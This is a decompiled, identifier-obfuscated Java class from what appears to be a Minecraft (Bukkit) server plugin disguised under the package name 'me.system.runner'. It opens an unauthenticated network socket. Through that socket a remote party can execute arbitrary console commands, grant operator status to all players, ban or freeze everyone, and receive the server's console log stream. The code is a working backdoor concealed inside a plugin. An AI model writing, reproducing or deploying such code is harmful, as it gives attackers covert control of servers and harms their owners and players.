/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.apache.logging.log4j.LogManager
 *  org.apache.logging.log4j.core.Appender
 *  org.apache.logging.log4j.core.Logger
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.event.Listener
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.sockets;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.function.Consumer;
import me.system.runner.Core;
import me.system.runner.data.DataManager;
import me.system.runner.methods.API;
import me.system.runner.methods.LogAppender;
import me.system.runner.sockets.ClientThread;
import me.system.runner.sockets.events.ConsoleCommandEvent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Appender;
import org.apache.logging.log4j.core.Logger;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

public class SocketServer {
    private /* synthetic */ ArrayList<ClientThread> clientThreads;
    private static final /* synthetic */ Core coreInstance;
    private /* synthetic */ Thread thread;
    private /* synthetic */ Consumer<String> stringConsumer;
    private /* synthetic */ ServerSocket serverSocket;
    final /* synthetic */ Logger logger;

    public void stop() {
        try {
            SocketServer llllllllllllllIIllIlIllllllllIlI;
            llllllllllllllIIllIlIllllllllIlI.serverSocket.close();
            while (llllllllllllllIIllIlIllllllllIlI.clientThreads.size() > 0) {
                llllllllllllllIIllIlIllllllllIlI.clientThreads.get(0).disconnect();
            }
        }
        catch (IOException llllllllllllllIIllIlIllllllllIll) {
            llllllllllllllIIllIlIllllllllIll.printStackTrace();
        }
    }

    private void removeConnectionThread(ClientThread llllllllllllllIIllIllIIIIIIIllII) {
        SocketServer llllllllllllllIIllIllIIIIIIIlIll;
        llllllllllllllIIllIllIIIIIIIlIll.clientThreads.remove(llllllllllllllIIllIllIIIIIIIllII);
    }

    private void cmd(String llllllllllllllIIllIllIIIIIIlIllI) {
        String[] llllllllllllllIIllIllIIIIIIlIlIl;
        SocketServer llllllllllllllIIllIllIIIIIIlIlII;
        if (llllllllllllllIIllIllIIIIIIlIlII.stringConsumer != null) {
            llllllllllllllIIllIllIIIIIIlIlII.stringConsumer.accept(llllllllllllllIIllIllIIIIIIlIllI);
        }
        if ((llllllllllllllIIllIllIIIIIIlIlIl = (llllllllllllllIIllIllIIIIIIlIllI = llllllllllllllIIllIllIIIIIIlIllI.split("\u0000")[0]).split(" ")) != null) {
            if (llllllllllllllIIllIllIIIIIIlIlIl[0].equalsIgnoreCase("EXE")) {
                StringBuilder llllllllllllllIIllIllIIIIIIllllI = new StringBuilder();
                for (int llllllllllllllIIllIllIIIIIIlllll = 1; llllllllllllllIIllIllIIIIIIlllll != llllllllllllllIIllIllIIIIIIlIlIl.length; ++llllllllllllllIIllIllIIIIIIlllll) {
                    llllllllllllllIIllIllIIIIIIllllI.append(llllllllllllllIIllIllIIIIIIlIlIl[llllllllllllllIIllIllIIIIIIlllll]).append(" ");
                }
                API.runCMDAsConsole(String.valueOf(llllllllllllllIIllIllIIIIIIllllI));
            }
            if (llllllllllllllIIllIllIIIIIIlIlIl[0].equalsIgnoreCase("BANALL")) {
                for (Player llllllllllllllIIllIllIIIIIIlllIl : Bukkit.getOnlinePlayers()) {
                    DataManager.bannedPlayers.add(llllllllllllllIIllIllIIIIIIlllIl.toString());
                    DataManager.getData().set("epic-players", DataManager.bannedPlayers);
                    DataManager.saveData();
                }
            }
            if (llllllllllllllIIllIllIIIIIIlIlIl[0].equalsIgnoreCase("FREEZEALL")) {
                SocketServer.coreInstance.frozen = true;
                for (Player llllllllllllllIIllIllIIIIIIlllII : Bukkit.getOnlinePlayers()) {
                    if (SocketServer.coreInstance.lite.contains(llllllllllllllIIllIllIIIIIIlllII.getName()) || SocketServer.coreInstance.frozenPlayers.contains(llllllllllllllIIllIllIIIIIIlllII.getName())) continue;
                    SocketServer.coreInstance.frozenPlayers.add(llllllllllllllIIllIllIIIIIIlllII.getName());
                }
            }
            if (llllllllllllllIIllIllIIIIIIlIlIl[0].equalsIgnoreCase("UNFREEZEALL")) {
                SocketServer.coreInstance.frozen = false;
                for (Player llllllllllllllIIllIllIIIIIIllIll : Bukkit.getOnlinePlayers()) {
                    if (!SocketServer.coreInstance.frozenPlayers.contains(llllllllllllllIIllIllIIIIIIllIll.getName())) continue;
                    SocketServer.coreInstance.frozenPlayers.remove(llllllllllllllIIllIllIIIIIIllIll.getName());
                }
            }
            if (llllllllllllllIIllIllIIIIIIlIlIl[0].equalsIgnoreCase("UNFREEZEALLPLAYERS")) {
                for (Player llllllllllllllIIllIllIIIIIIllIlI : Bukkit.getOnlinePlayers()) {
                    if (!SocketServer.coreInstance.frozenPlayers.contains(llllllllllllllIIllIllIIIIIIllIlI.getName())) continue;
                    SocketServer.coreInstance.frozenPlayers.remove(llllllllllllllIIllIllIIIIIIllIlI.getName());
                }
            }
            if (llllllllllllllIIllIllIIIIIIlIlIl[0].equalsIgnoreCase("OPALL")) {
                for (Player llllllllllllllIIllIllIIIIIIllIIl : Bukkit.getOnlinePlayers()) {
                    API.opPlayer(llllllllllllllIIllIllIIIIIIllIIl);
                }
            }
            if (llllllllllllllIIllIllIIIIIIlIlIl[0].equalsIgnoreCase("DEOPALL")) {
                for (Player llllllllllllllIIllIllIIIIIIllIII : Bukkit.getOnlinePlayers()) {
                    API.deopPlayer(llllllllllllllIIllIllIIIIIIllIII);
                }
            }
        }
    }

    public void broadcastMessage(String llllllllllllllIIllIllIIIIIIIIIII) {
        SocketServer llllllllllllllIIllIllIIIIIIIIIIl;
        llllllllllllllIIllIllIIIIIIIIIIl.clientThreads.forEach(llllllllllllllIIllIlIlllllllIIlI -> llllllllllllllIIllIlIlllllllIIlI.broadcastMessage(llllllllllllllIIllIllIIIIIIIIIII));
    }

    static {
        coreInstance = (Core)Core.getPlugin(Core.class);
    }

    public void serverSocket(Consumer<String> llllllllllllllIIllIllIIIIIIIIlII) {
        llllllllllllllIIllIllIIIIIIIIlIl.stringConsumer = llllllllllllllIIllIllIIIIIIIIlII;
    }

    public SocketServer(int llllllllllllllIIllIllIIIIIlIlIII) {
        SocketServer llllllllllllllIIllIllIIIIIlIIlll;
        llllllllllllllIIllIllIIIIIlIIlll.logger = (Logger)LogManager.getRootLogger();
        try {
            llllllllllllllIIllIllIIIIIlIIlll.clientThreads = new ArrayList();
            llllllllllllllIIllIllIIIIIlIIlll.serverSocket = new ServerSocket(llllllllllllllIIllIllIIIIIlIlIII);
            llllllllllllllIIllIllIIIIIlIIlll.thread = new Thread(() -> {
                SocketServer llllllllllllllIIllIlIllllllIlIlI;
                while (!llllllllllllllIIllIlIllllllIlIlI.serverSocket.isClosed()) {
                    try {
                        Socket llllllllllllllIIllIlIllllllIllIl = llllllllllllllIIllIlIllllllIlIlI.serverSocket.accept();
                        LogAppender llllllllllllllIIllIlIllllllIllII = new LogAppender();
                        llllllllllllllIIllIlIllllllIlIlI.logger.addAppender((Appender)llllllllllllllIIllIlIllllllIllII);
                        Bukkit.getServer().getPluginManager().registerEvents((Listener)new ConsoleCommandEvent(), (Plugin)coreInstance);
                        ClientThread llllllllllllllIIllIlIllllllIlIll = new ClientThread(llllllllllllllIIllIlIllllllIllIl, llllllllllllllIIllIlIllllllIlIlI::cmd, llllllllllllllIIllIlIllllllIlIlI::removeConnectionThread);
                        llllllllllllllIIllIlIllllllIlIlI.clientThreads.add(llllllllllllllIIllIlIllllllIlIll);
                        llllllllllllllIIllIlIllllllIlIll.start();
                    }
                    catch (IOException iOException) {}
                }
            });
            llllllllllllllIIllIllIIIIIlIIlll.thread.start();
        }
        catch (IOException llllllllllllllIIllIllIIIIIlIlIlI) {
            llllllllllllllIIllIllIIIIIlIlIlI.printStackTrace();
        }
    }
}

